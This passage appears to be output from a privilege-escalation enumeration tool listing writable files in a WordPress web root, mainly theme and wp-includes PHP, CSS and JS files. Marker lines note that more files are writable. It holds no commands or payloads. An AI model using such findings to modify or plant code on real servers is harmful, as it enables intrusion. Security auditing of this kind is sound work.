/var/www/wordpress/wp-content/themes/twentynineteen/print.css
/var/www/wordpress/wp-content/themes/twentynineteen/print.scss
/var/www/wordpress/wp-content/themes/twentynineteen/readme.txt
/var/www/wordpress/wp-content/themes/twentynineteen/sass
/var/www/wordpress/wp-content/themes/twentynineteen/sass/_normalize.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/blocks
/var/www/wordpress/wp-content/themes/twentynineteen/sass/blocks/_blocks.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/elements
/var/www/wordpress/wp-content/themes/twentynineteen/sass/elements/_elements.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/elements/_lists.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/elements/_tables.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/forms
/var/www/wordpress/wp-content/themes/twentynineteen/sass/forms/_buttons.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/forms/_fields.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/forms/_forms.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/layout
/var/www/wordpress/wp-content/themes/twentynineteen/sass/layout/_layout.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/media
/var/www/wordpress/wp-content/themes/twentynineteen/sass/media/_captions.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/media/_galleries.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/media/_media.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/mixins
/var/www/wordpress/wp-content/themes/twentynineteen/sass/mixins/_mixins-master.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/mixins/_utilities.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/modules
/var/www/wordpress/wp-content/themes/twentynineteen/sass/modules/_accessibility.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/modules/_alignments.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/modules/_clearings.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/navigation
/var/www/wordpress/wp-content/themes/twentynineteen/sass/navigation/_links.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/navigation/_menu-footer-navigation.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/navigation/_menu-main-navigation.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/navigation/_menu-social-navigation.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/navigation/_navigation.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/navigation/_next-previous.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/site
/var/www/wordpress/wp-content/themes/twentynineteen/sass/site/_site.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/site/footer
/var/www/wordpress/wp-content/themes/twentynineteen/sass/site/footer/_site-footer.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/site/header
/var/www/wordpress/wp-content/themes/twentynineteen/sass/site/header/_site-featured-image.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/site/header/_site-header.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/site/primary
/var/www/wordpress/wp-content/themes/twentynineteen/sass/site/primary/_archives.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/site/primary/_comments.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/site/primary/_posts-and-pages.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/site/secondary
/var/www/wordpress/wp-content/themes/twentynineteen/sass/site/secondary/_widgets.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/typography
/var/www/wordpress/wp-content/themes/twentynineteen/sass/typography/_copy.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/typography/_headings.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/typography/_typography.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/variables-site
/var/www/wordpress/wp-content/themes/twentynineteen/sass/variables-site/_colors.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/variables-site/_columns.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/variables-site/_fonts.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/variables-site/_structure.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/variables-site/_transitions.scss
/var/www/wordpress/wp-content/themes/twentynineteen/sass/variables-site/_variables-site.scss
/var/www/wordpress/wp-content/themes/twentynineteen/search.php
/var/www/wordpress/wp-content/themes/twentynineteen/single.php
/var/www/wordpress/wp-content/themes/twentynineteen/style-editor-customizer.css
/var/www/wordpress/wp-content/themes/twentynineteen/style-editor-customizer.scss
/var/www/wordpress/wp-content/themes/twentynineteen/style-editor.css
/var/www/wordpress/wp-content/themes/twentynineteen/style-editor.scss
/var/www/wordpress/wp-content/themes/twentynineteen/style-rtl.css
/var/www/wordpress/wp-content/themes/twentynineteen/style.css
/var/www/wordpress/wp-content/themes/twentynineteen/style.scss
/var/www/wordpress/wp-content/themes/twentynineteen/template-parts
/var/www/wordpress/wp-content/themes/twentynineteen/template-parts/content
/var/www/wordpress/wp-content/themes/twentynineteen/template-parts/content/content-excerpt.php
/var/www/wordpress/wp-content/themes/twentynineteen/template-parts/content/content-none.php
/var/www/wordpress/wp-content/themes/twentynineteen/template-parts/content/content-page.php
/var/www/wordpress/wp-content/themes/twentynineteen/template-parts/content/content-single.php
/var/www/wordpress/wp-content/themes/twentynineteen/template-parts/content/content.php
/var/www/wordpress/wp-content/themes/twentynineteen/template-parts/footer
/var/www/wordpress/wp-content/themes/twentynineteen/template-parts/footer/footer-widgets.php
/var/www/wordpress/wp-content/themes/twentynineteen/template-parts/header
/var/www/wordpress/wp-content/themes/twentynineteen/template-parts/header/entry-header.php
/var/www/wordpress/wp-content/themes/twentynineteen/template-parts/header/site-branding.php
/var/www/wordpress/wp-content/themes/twentynineteen/template-parts/post
/var/www/wordpress/wp-content/themes/twentynineteen/template-parts/post/author-bio.php
/var/www/wordpress/wp-content/themes/twentynineteen/template-parts/post/discussion-meta.php
/var/www/wordpress/wp-content/themes/twentyseventeen
/var/www/wordpress/wp-content/themes/twentyseventeen/404.php
/var/www/wordpress/wp-content/themes/twentyseventeen/archive.php
/var/www/wordpress/wp-content/themes/twentyseventeen/assets
/var/www/wordpress/wp-content/themes/twentyseventeen/assets/css
/var/www/wordpress/wp-content/themes/twentyseventeen/assets/css/blocks.css
/var/www/wordpress/wp-content/themes/twentyseventeen/assets/css/colors-dark.css
/var/www/wordpress/wp-content/themes/twentyseventeen/assets/css/editor-blocks.css
/var/www/wordpress/wp-content/themes/twentyseventeen/assets/css/editor-style.css
/var/www/wordpress/wp-content/themes/twentyseventeen/assets/css/ie8.css
/var/www/wordpress/wp-content/themes/twentyseventeen/assets/css/ie9.css
/var/www/wordpress/wp-content/themes/twentyseventeen/assets/images
/var/www/wordpress/wp-content/themes/twentyseventeen/assets/images/svg-icons.svg
/var/www/wordpress/wp-content/themes/twentyseventeen/assets/js
/var/www/wordpress/wp-content/themes/twentyseventeen/assets/js/customize-controls.js
/var/www/wordpress/wp-content/themes/twentyseventeen/assets/js/customize-preview.js
/var/www/wordpress/wp-content/themes/twentyseventeen/assets/js/global.js
/var/www/wordpress/wp-content/themes/twentyseventeen/assets/js/html5.js
/var/www/wordpress/wp-content/themes/twentyseventeen/assets/js/jquery.scrollTo.js
/var/www/wordpress/wp-content/themes/twentyseventeen/assets/js/navigation.js
/var/www/wordpress/wp-content/themes/twentyseventeen/assets/js/skip-link-focus-fix.js
/var/www/wordpress/wp-content/themes/twentyseventeen/comments.php
/var/www/wordpress/wp-content/themes/twentyseventeen/footer.php
/var/www/wordpress/wp-content/themes/twentyseventeen/front-page.php
/var/www/wordpress/wp-content/themes/twentyseventeen/functions.php
/var/www/wordpress/wp-content/themes/twentyseventeen/header.php
/var/www/wordpress/wp-content/themes/twentyseventeen/inc
/var/www/wordpress/wp-content/themes/twentyseventeen/inc/back-compat.php
/var/www/wordpress/wp-content/themes/twentyseventeen/inc/color-patterns.php
/var/www/wordpress/wp-content/themes/twentyseventeen/inc/custom-header.php
/var/www/wordpress/wp-content/themes/twentyseventeen/inc/customizer.php
/var/www/wordpress/wp-content/themes/twentyseventeen/inc/icon-functions.php
/var/www/wordpress/wp-content/themes/twentyseventeen/inc/template-functions.php
/var/www/wordpress/wp-content/themes/twentyseventeen/inc/template-tags.php
/var/www/wordpress/wp-content/themes/twentyseventeen/index.php
/var/www/wordpress/wp-content/themes/twentyseventeen/page.php
/var/www/wordpress/wp-content/themes/twentyseventeen/readme.txt
/var/www/wordpress/wp-content/themes/twentyseventeen/rtl.css
/var/www/wordpress/wp-content/themes/twentyseventeen/search.php
/var/www/wordpress/wp-content/themes/twentyseventeen/searchform.php
/var/www/wordpress/wp-content/themes/twentyseventeen/sidebar.php
/var/www/wordpress/wp-content/themes/twentyseventeen/single.php
/var/www/wordpress/wp-content/themes/twentyseventeen/style.css
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts/footer
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts/footer/footer-widgets.php
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts/footer/site-info.php
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts/header
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts/header/header-image.php
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts/header/site-branding.php
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts/navigation
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts/navigation/navigation-top.php
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts/page
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts/page/content-front-page-panels.php
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts/page/content-front-page.php
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts/page/content-page.php
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts/post
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts/post/content-audio.php
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts/post/content-excerpt.php
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts/post/content-gallery.php
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts/post/content-image.php
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts/post/content-none.php
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts/post/content-video.php
/var/www/wordpress/wp-content/themes/twentyseventeen/template-parts/post/content.php
/var/www/wordpress/wp-content/themes/twentysixteen
/var/www/wordpress/wp-content/themes/twentysixteen/404.php
/var/www/wordpress/wp-content/themes/twentysixteen/archive.php
/var/www/wordpress/wp-content/themes/twentysixteen/comments.php
/var/www/wordpress/wp-content/themes/twentysixteen/css
/var/www/wordpress/wp-content/themes/twentysixteen/css/blocks.css
/var/www/wordpress/wp-content/themes/twentysixteen/css/editor-blocks.css
/var/www/wordpress/wp-content/themes/twentysixteen/css/editor-style.css
/var/www/wordpress/wp-content/themes/twentysixteen/css/ie.css
/var/www/wordpress/wp-content/themes/twentysixteen/css/ie7.css
/var/www/wordpress/wp-content/themes/twentysixteen/css/ie8.css
/var/www/wordpress/wp-content/themes/twentysixteen/footer.php
/var/www/wordpress/wp-content/themes/twentysixteen/functions.php
/var/www/wordpress/wp-content/themes/twentysixteen/genericons
/var/www/wordpress/wp-content/themes/twentysixteen/genericons/COPYING.txt
/var/www/wordpress/wp-content/themes/twentysixteen/genericons/Genericons.eot
/var/www/wordpress/wp-content/themes/twentysixteen/genericons/Genericons.svg
/var/www/wordpress/wp-content/themes/twentysixteen/genericons/Genericons.ttf
/var/www/wordpress/wp-content/themes/twentysixteen/genericons/Genericons.woff
/var/www/wordpress/wp-content/themes/twentysixteen/genericons/LICENSE.txt
/var/www/wordpress/wp-content/themes/twentysixteen/genericons/README.md
/var/www/wordpress/wp-content/themes/twentysixteen/genericons/genericons.css
/var/www/wordpress/wp-content/themes/twentysixteen/header.php
/var/www/wordpress/wp-content/themes/twentysixteen/image.php
/var/www/wordpress/wp-content/themes/twentysixteen/inc
/var/www/wordpress/wp-content/themes/twentysixteen/inc/back-compat.php
/var/www/wordpress/wp-content/themes/twentysixteen/inc/customizer.php
/var/www/wordpress/wp-content/themes/twentysixteen/inc/template-tags.php
/var/www/wordpress/wp-content/themes/twentysixteen/index.php
/var/www/wordpress/wp-content/themes/twentysixteen/js
/var/www/wordpress/wp-content/themes/twentysixteen/js/color-scheme-control.js
/var/www/wordpress/wp-content/themes/twentysixteen/js/customize-preview.js
/var/www/wordpress/wp-content/themes/twentysixteen/js/functions.js
/var/www/wordpress/wp-content/themes/twentysixteen/js/html5.js
/var/www/wordpress/wp-content/themes/twentysixteen/js/keyboard-image-navigation.js
/var/www/wordpress/wp-content/themes/twentysixteen/js/skip-link-focus-fix.js
/var/www/wordpress/wp-content/themes/twentysixteen/page.php
/var/www/wordpress/wp-content/themes/twentysixteen/readme.txt
/var/www/wordpress/wp-content/themes/twentysixteen/rtl.css
/var/www/wordpress/wp-content/themes/twentysixteen/search.php
/var/www/wordpress/wp-content/themes/twentysixteen/searchform.php
/var/www/wordpress/wp-content/themes/twentysixteen/sidebar-content-bottom.php
/var/www/wordpress/wp-content/themes/twentysixteen/sidebar.php
/var/www/wordpress/wp-content/themes/twentysixteen/single.php
/var/www/wordpress/wp-content/themes/twentysixteen/style.css
/var/www/wordpress/wp-content/themes/twentysixteen/template-parts
/var/www/wordpress/wp-content/themes/twentysixteen/template-parts/biography.php
/var/www/wordpress/wp-content/themes/twentysixteen/template-parts/content-none.php
/var/www/wordpress/wp-content/themes/twentysixteen/template-parts/content-page.php
/var/www/wordpress/wp-content/themes/twentysixteen/template-parts/content-search.php
/var/www/wordpress/wp-content/themes/twentysixteen/template-parts/content-single.php
/var/www/wordpress/wp-content/themes/twentysixteen/template-parts/content.php
/var/www/wordpress/wp-content/themes/twentytwenty
/var/www/wordpress/wp-content/themes/twentytwenty/.stylelintrc.json
/var/www/wordpress/wp-content/themes/twentytwenty/404.php
/var/www/wordpress/wp-content/themes/twentytwenty/assets
/var/www/wordpress/wp-content/themes/twentytwenty/assets/css
/var/www/wordpress/wp-content/themes/twentytwenty/assets/css/editor-style-block-rtl.css
/var/www/wordpress/wp-content/themes/twentytwenty/assets/css/editor-style-block.css
/var/www/wordpress/wp-content/themes/twentytwenty/assets/css/editor-style-block.css.orig
/var/www/wordpress/wp-content/themes/twentytwenty/assets/css/editor-style-classic-rtl.css
/var/www/wordpress/wp-content/themes/twentytwenty/assets/css/editor-style-classic.css
/var/www/wordpress/wp-content/themes/twentytwenty/assets/fonts
/var/www/wordpress/wp-content/themes/twentytwenty/assets/fonts/inter
/var/www/wordpress/wp-content/themes/twentytwenty/assets/fonts/inter/Inter-italic-var.woff2
/var/www/wordpress/wp-content/themes/twentytwenty/assets/fonts/inter/Inter-upright-var.woff2
/var/www/wordpress/wp-content/themes/twentytwenty/assets/images
/var/www/wordpress/wp-content/themes/twentytwenty/assets/js
/var/www/wordpress/wp-content/themes/twentytwenty/assets/js/color-calculations.js
/var/www/wordpress/wp-content/themes/twentytwenty/assets/js/customize-controls.js
/var/www/wordpress/wp-content/themes/twentytwenty/assets/js/customize-preview.js
/var/www/wordpress/wp-content/themes/twentytwenty/assets/js/customize.js
/var/www/wordpress/wp-content/themes/twentytwenty/assets/js/editor-script-block.js
/var/www/wordpress/wp-content/themes/twentytwenty/assets/js/index.js
/var/www/wordpress/wp-content/themes/twentytwenty/assets/js/skip-link-focus-fix.js
/var/www/wordpress/wp-content/themes/twentytwenty/classes
/var/www/wordpress/wp-content/themes/twentytwenty/classes/class-twentytwenty-customize.php
/var/www/wordpress/wp-content/themes/twentytwenty/classes/class-twentytwenty-non-latin-languages.php
/var/www/wordpress/wp-content/themes/twentytwenty/classes/class-twentytwenty-script-loader.php
/var/www/wordpress/wp-content/themes/twentytwenty/classes/class-twentytwenty-separator-control.php
/var/www/wordpress/wp-content/themes/twentytwenty/classes/class-twentytwenty-svg-icons.php
/var/www/wordpress/wp-content/themes/twentytwenty/classes/class-twentytwenty-svg-icons.php.orig
/var/www/wordpress/wp-content/themes/twentytwenty/classes/class-twentytwenty-walker-comment.php
/var/www/wordpress/wp-content/themes/twentytwenty/classes/class-twentytwenty-walker-page.php
/var/www/wordpress/wp-content/themes/twentytwenty/comments.php
/var/www/wordpress/wp-content/themes/twentytwenty/footer.php
/var/www/wordpress/wp-content/themes/twentytwenty/functions.php
/var/www/wordpress/wp-content/themes/twentytwenty/header.php
/var/www/wordpress/wp-content/themes/twentytwenty/inc
/var/www/wordpress/wp-content/themes/twentytwenty/inc/custom-css.php
/var/www/wordpress/wp-content/themes/twentytwenty/inc/starter-content.php
/var/www/wordpress/wp-content/themes/twentytwenty/inc/svg-icons.php
/var/www/wordpress/wp-content/themes/twentytwenty/inc/template-tags.php
/var/www/wordpress/wp-content/themes/twentytwenty/index.php
/var/www/wordpress/wp-content/themes/twentytwenty/package-lock.json
/var/www/wordpress/wp-content/themes/twentytwenty/package.json
/var/www/wordpress/wp-content/themes/twentytwenty/print.css
/var/www/wordpress/wp-content/themes/twentytwenty/readme.txt
/var/www/wordpress/wp-content/themes/twentytwenty/searchform.php
/var/www/wordpress/wp-content/themes/twentytwenty/singular.php
/var/www/wordpress/wp-content/themes/twentytwenty/style-rtl.css
/var/www/wordpress/wp-content/themes/twentytwenty/style.css
/var/www/wordpress/wp-content/themes/twentytwenty/template-parts
/var/www/wordpress/wp-content/themes/twentytwenty/template-parts/content-cover.php
/var/www/wordpress/wp-content/themes/twentytwenty/template-parts/content.php
/var/www/wordpress/wp-content/themes/twentytwenty/template-parts/entry-author-bio.php
/var/www/wordpress/wp-content/themes/twentytwenty/template-parts/entry-header.php
/var/www/wordpress/wp-content/themes/twentytwenty/template-parts/featured-image.php
/var/www/wordpress/wp-content/themes/twentytwenty/template-parts/footer-menus-widgets.php
/var/www/wordpress/wp-content/themes/twentytwenty/template-parts/modal-menu.php
/var/www/wordpress/wp-content/themes/twentytwenty/template-parts/modal-search.php
/var/www/wordpress/wp-content/themes/twentytwenty/template-parts/navigation.php
/var/www/wordpress/wp-content/themes/twentytwenty/template-parts/pagination.php
/var/www/wordpress/wp-content/themes/twentytwenty/templates
/var/www/wordpress/wp-content/themes/twentytwenty/templates/template-cover.php
/var/www/wordpress/wp-content/themes/twentytwenty/templates/template-full-width.php
/var/www/wordpress/wp-content/themes/visual-blog
/var/www/wordpress/wp-content/themes/visual-blog/404.php
/var/www/wordpress/wp-content/themes/visual-blog/archive.php
/var/www/wordpress/wp-content/themes/visual-blog/assets
/var/www/wordpress/wp-content/themes/visual-blog/assets/css
/var/www/wordpress/wp-content/themes/visual-blog/assets/css/all.css
/var/www/wordpress/wp-content/themes/visual-blog/assets/css/blocks.css
/var/www/wordpress/wp-content/themes/visual-blog/assets/css/bootstrap.css
/var/www/wordpress/wp-content/themes/visual-blog/assets/css/bootstrap.min.css
/var/www/wordpress/wp-content/themes/visual-blog/assets/css/editor-blocks.css
/var/www/wordpress/wp-content/themes/visual-blog/assets/css/editor-style.css
/var/www/wordpress/wp-content/themes/visual-blog/assets/css/inline-css.php
/var/www/wordpress/wp-content/themes/visual-blog/assets/css/visual-main.css
/var/www/wordpress/wp-content/themes/visual-blog/assets/js
/var/www/wordpress/wp-content/themes/visual-blog/assets/js/admin.js
/var/www/wordpress/wp-content/themes/visual-blog/assets/js/bootstrap.js
/var/www/wordpress/wp-content/themes/visual-blog/assets/js/bootstrap.min.js
/var/www/wordpress/wp-content/themes/visual-blog/assets/js/customizer.js
/var/www/wordpress/wp-content/themes/visual-blog/assets/js/navigation.js
/var/www/wordpress/wp-content/themes/visual-blog/assets/js/skip-link-focus-fix.js
/var/www/wordpress/wp-content/themes/visual-blog/assets/js/visual-blog.js
/var/www/wordpress/wp-content/themes/visual-blog/assets/webfonts
/var/www/wordpress/wp-content/themes/visual-blog/assets/webfonts/fa-brands-400.eot
/var/www/wordpress/wp-content/themes/visual-blog/assets/webfonts/fa-brands-400.svg
/var/www/wordpress/wp-content/themes/visual-blog/assets/webfonts/fa-brands-400.ttf
/var/www/wordpress/wp-content/themes/visual-blog/assets/webfonts/fa-brands-400.woff
/var/www/wordpress/wp-content/themes/visual-blog/assets/webfonts/fa-brands-400.woff2
/var/www/wordpress/wp-content/themes/visual-blog/assets/webfonts/fa-regular-400.eot
/var/www/wordpress/wp-content/themes/visual-blog/assets/webfonts/fa-regular-400.svg
/var/www/wordpress/wp-content/themes/visual-blog/assets/webfonts/fa-regular-400.ttf
/var/www/wordpress/wp-content/themes/visual-blog/assets/webfonts/fa-regular-400.woff
/var/www/wordpress/wp-content/themes/visual-blog/assets/webfonts/fa-regular-400.woff2
/var/www/wordpress/wp-content/themes/visual-blog/assets/webfonts/fa-solid-900.eot
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-content/themes/visual-blog/footer.php
/var/www/wordpress/wp-content/themes/visual-blog/functions.php
/var/www/wordpress/wp-content/themes/visual-blog/header.php
/var/www/wordpress/wp-content/themes/visual-blog/inc
/var/www/wordpress/wp-content/themes/visual-blog/inc/bootstrap-navwalker.php
/var/www/wordpress/wp-content/themes/visual-blog/inc/class-tgm-plugin-activation.php
/var/www/wordpress/wp-content/themes/visual-blog/inc/custom-header.php
/var/www/wordpress/wp-content/themes/visual-blog/inc/customizer.php
/var/www/wordpress/wp-content/themes/visual-blog/inc/info
/var/www/wordpress/wp-content/themes/visual-blog/inc/info/class-customize.php
/var/www/wordpress/wp-content/themes/visual-blog/inc/info/customize-controls.css
/var/www/wordpress/wp-content/themes/visual-blog/inc/info/customize-controls.js
/var/www/wordpress/wp-content/themes/visual-blog/inc/info/section-pro.php
/var/www/wordpress/wp-content/themes/visual-blog/inc/inline-css.php
/var/www/wordpress/wp-content/themes/visual-blog/inc/recomend-plugin.php
/var/www/wordpress/wp-content/themes/visual-blog/inc/template-functions.php
/var/www/wordpress/wp-content/themes/visual-blog/inc/template-tags.php
/var/www/wordpress/wp-content/themes/visual-blog/index.php
/var/www/wordpress/wp-content/themes/visual-blog/languages
/var/www/wordpress/wp-content/themes/visual-blog/languages/visual-blog.pot
/var/www/wordpress/wp-content/themes/visual-blog/no-sidebar.php
/var/www/wordpress/wp-content/themes/visual-blog/page.php
/var/www/wordpress/wp-content/themes/visual-blog/readme.txt
/var/www/wordpress/wp-content/themes/visual-blog/search.php
/var/www/wordpress/wp-content/themes/visual-blog/searchform.php
/var/www/wordpress/wp-content/themes/visual-blog/sidebar.php
/var/www/wordpress/wp-content/themes/visual-blog/single.php
/var/www/wordpress/wp-content/themes/visual-blog/style.css
/var/www/wordpress/wp-content/themes/visual-blog/template-fullwidth.php
/var/www/wordpress/wp-content/themes/visual-blog/template-parts
/var/www/wordpress/wp-content/themes/visual-blog/template-parts/content-none.php
/var/www/wordpress/wp-content/themes/visual-blog/template-parts/content-page.php
/var/www/wordpress/wp-content/themes/visual-blog/template-parts/content-search.php
/var/www/wordpress/wp-content/themes/visual-blog/template-parts/content.php
/var/www/wordpress/wp-content/upgrade
/var/www/wordpress/wp-content/uploads
/var/www/wordpress/wp-content/uploads/2020
/var/www/wordpress/wp-content/uploads/2020/05
/var/www/wordpress/wp-content/uploads/2020/06
/var/www/wordpress/wp-content/uploads/2020/07
/var/www/wordpress/wp-cron.php
/var/www/wordpress/wp-includes
/var/www/wordpress/wp-includes/ID3
/var/www/wordpress/wp-includes/ID3/getid3.lib.php
/var/www/wordpress/wp-includes/ID3/getid3.php
/var/www/wordpress/wp-includes/ID3/license.commercial.txt
/var/www/wordpress/wp-includes/ID3/license.txt
/var/www/wordpress/wp-includes/ID3/module.audio-video.asf.php
/var/www/wordpress/wp-includes/ID3/module.audio-video.flv.php
/var/www/wordpress/wp-includes/ID3/module.audio-video.matroska.php
/var/www/wordpress/wp-includes/ID3/module.audio-video.quicktime.php
/var/www/wordpress/wp-includes/ID3/module.audio-video.riff.php
/var/www/wordpress/wp-includes/ID3/module.audio.ac3.php
/var/www/wordpress/wp-includes/ID3/module.audio.dts.php
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/IXR/class-IXR-base64.php
/var/www/wordpress/wp-includes/IXR/class-IXR-client.php
/var/www/wordpress/wp-includes/IXR/class-IXR-clientmulticall.php
/var/www/wordpress/wp-includes/IXR/class-IXR-date.php
/var/www/wordpress/wp-includes/IXR/class-IXR-error.php
/var/www/wordpress/wp-includes/IXR/class-IXR-introspectionserver.php
/var/www/wordpress/wp-includes/IXR/class-IXR-message.php
/var/www/wordpress/wp-includes/IXR/class-IXR-request.php
/var/www/wordpress/wp-includes/IXR/class-IXR-server.php
/var/www/wordpress/wp-includes/IXR/class-IXR-value.php
/var/www/wordpress/wp-includes/Requests
/var/www/wordpress/wp-includes/Requests/Auth
/var/www/wordpress/wp-includes/Requests/Auth.php
/var/www/wordpress/wp-includes/Requests/Auth/Basic.php
/var/www/wordpress/wp-includes/Requests/Cookie
/var/www/wordpress/wp-includes/Requests/Cookie.php
/var/www/wordpress/wp-includes/Requests/Cookie/Jar.php
/var/www/wordpress/wp-includes/Requests/Exception
/var/www/wordpress/wp-includes/Requests/Exception.php
/var/www/wordpress/wp-includes/Requests/Exception/HTTP
/var/www/wordpress/wp-includes/Requests/Exception/HTTP.php
/var/www/wordpress/wp-includes/Requests/Exception/HTTP/304.php
/var/www/wordpress/wp-includes/Requests/Exception/HTTP/305.php
/var/www/wordpress/wp-includes/Requests/Exception/HTTP/306.php
/var/www/wordpress/wp-includes/Requests/Exception/HTTP/400.php
/var/www/wordpress/wp-includes/Requests/Exception/HTTP/401.php
/var/www/wordpress/wp-includes/Requests/Exception/HTTP/402.php
/var/www/wordpress/wp-includes/Requests/Exception/HTTP/403.php
/var/www/wordpress/wp-includes/Requests/Exception/HTTP/404.php
/var/www/wordpress/wp-includes/Requests/Exception/HTTP/405.php
/var/www/wordpress/wp-includes/Requests/Exception/HTTP/406.php
/var/www/wordpress/wp-includes/Requests/Exception/HTTP/407.php
-->You_can_write_even_more_files_inside_last_directory
/var/www/wordpress/wp-includes/Requests/Exception/Transport.php
/var/www/wordpress/wp-includes/Requests/Exception/Transport/cURL.php
/var/www/wordpress/wp-includes/Requests/Hooker.php
/var/www/wordpress/wp-includes/Requests/Hooks.php
/var/www/wordpress/wp-includes/Requests/IDNAEncoder.php
/var/www/wordpress/wp-includes/Requests/IPv6.php
/var/www/wordpress/wp-includes/Requests/IRI.php
/var/www/wordpress/wp-includes/Requests/Proxy
/var/www/wordpress/wp-includes/Requests/Proxy.php
/var/www/wordpress/wp-includes/Requests/Proxy/HTTP.php
/var/www/wordpress/wp-includes/Requests/Response
/var/www/wordpress/wp-includes/Requests/Response.php
/var/www/wordpress/wp-includes/Requests/Response/Headers.php
/var/www/wordpress/wp-includes/Requests/SSL.php
/var/www/wordpress/wp-includes/Requests/Session.php
/var/www/wordpress/wp-includes/Requests/Transport
/var/www/wordpress/wp-includes/Requests/Transport.php
/var/www/wordpress/wp-includes/Requests/Transport/cURL.php
/var/www/wordpress/wp-includes/Requests/Transport/fsockopen.php
/var/www/wordpress/wp-includes/Requests/Utility
/var/www/wordpress/wp-includes/Requests/Utility/CaseInsensitiveDictionary.php
/var/www/wordpress/wp-includes/Requests/Utility/FilteredIterator.php
/var/www/wordpress/wp-includes/SimplePie
/var/www/wordpress/wp-includes/SimplePie/Author.php
/var/www/wordpress/wp-includes/SimplePie/Cache
/var/www/wordpress/wp-includes/SimplePie/Cache.php
/var/www/wordpress/wp-includes/SimplePie/Cache/Base.php
/var/www/wordpress/wp-includes/SimplePie/Cache/DB.php
/var/www/wordpress/wp-includes/SimplePie/Cache/File.php
/var/www/wordpress/wp-includes/SimplePie/Cache/Memcache.php
/var/www/wordpress/wp-includes/SimplePie/Cache/MySQL.php
/var/www/wordpress/wp-includes/SimplePie/Caption.php
/var/www/wordpress/wp-includes/SimplePie/Category.php
/var/www/wordpress/wp-includes/SimplePie/Content
/var/www/wordpress/wp-includes/SimplePie/Content/Type
/var/www/wordpress/wp-includes/SimplePie/Content/Type/Sniffer.php
/var/www/wordpress/wp-includes/SimplePie/Copyright.php
/var/www/wordpress/wp-includes/SimplePie/Core.php
/var/www/wordpress/wp-includes/SimplePie/Credit.php
/var/www/wordpress/wp-includes/SimplePie/Decode
/var/www/wordpress/wp-includes/SimplePie/Decode/HTML
/var/www/wordpress/wp-includes/SimplePie/Decode/HTML/Entities.php
/var/www/wordpress/wp-includes/SimplePie/Enclosure.php
/var/www/wordpress/wp-includes/SimplePie/Exception.php
/var/www/wordpress/wp-includes/SimplePie/File.php
/var/www/wordpress/wp-includes/SimplePie/HTTP
/var/www/wordpress/wp-includes/SimplePie/HTTP/Parser.php
/var/www/wordpress/wp-includes/SimplePie/IRI.php
/var/www/wordpress/wp-includes/SimplePie/Item.php
/var/www/wordpress/wp-includes/SimplePie/Locator.php
/var/www/wordpress/wp-includes/SimplePie/Misc.php
/var/www/wordpress/wp-includes/SimplePie/Net
/var/www/wordpress/wp-includes/SimplePie/Net/IPv6.php
/var/www/wordpress/wp-includes/SimplePie/Parse
/var/www/wordpress/wp-includes/SimplePie/Parse/Date.php
/var/www/wordpress/wp-includes/SimplePie/Parser.php
/var/www/wordpress/wp-includes/SimplePie/Rating.php
/var/www/wordpress/wp-includes/SimplePie/Registry.php
/var/www/wordpress/wp-includes/SimplePie/Restriction.php
/var/www/wordpress/wp-includes/SimplePie/Sanitize.php
/var/www/wordpress/wp-includes/SimplePie/Source.php
/var/www/wordpress/wp-includes/SimplePie/XML
/var/www/wordpress/wp-includes/SimplePie/XML/Declaration
